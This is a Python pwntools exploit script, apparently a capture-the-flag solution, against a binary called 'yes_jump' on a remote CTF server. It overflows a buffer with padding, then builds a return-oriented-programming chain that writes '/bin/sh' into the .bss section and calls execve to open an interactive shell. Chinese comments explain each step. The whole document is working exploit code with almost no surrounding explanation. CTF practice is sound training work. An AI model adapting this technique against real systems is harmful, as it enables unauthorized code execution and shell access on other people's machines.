from pwn import *

context.arch = "amd64"

elf = ELF("./yes_jump")
rop = ROP(elf)
p = remote('ctf.adl.tw', 10004)

bss_addr = elf.bss() + 0x80

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address

pop_rax_rdx_rbx = 0x485b2a
syscall = 0x474d1c

rop = ROP(elf)

# 先把 "/bin/sh"argv 寫入 bss
rop.read(0, bss_addr, 0x18)

# RDI = bss_addr指向 "/bin/sh"
rop.raw(pop_rdi)
rop.raw(bss_addr)

# RSI = bss_addr + 8指向 argv 陣列
rop.raw(pop_rsi)
rop.raw(bss_addr + 8)

# 使用：
# pop rax
# pop rdx
# pop rbx
# ret
rop.raw(pop_rax_rdx_rbx)
rop.raw(59)   # RAX = __NR_execve
rop.raw(0)    # RDX = envp = NULL
rop.raw(0)    # RBX padding

# 執行 syscall
rop.raw(syscall)

payload = b"A" * 32
payload += b"B" * 8
payload += rop.chain()

p.send(payload)

# 這些資料會被前面的 read(0, bss_addr, 0x18) 寫入 bss
data = b"/bin/sh\x00"
data += p64(bss_addr)
data += p64(0)

p.send(data)
p.interactive()
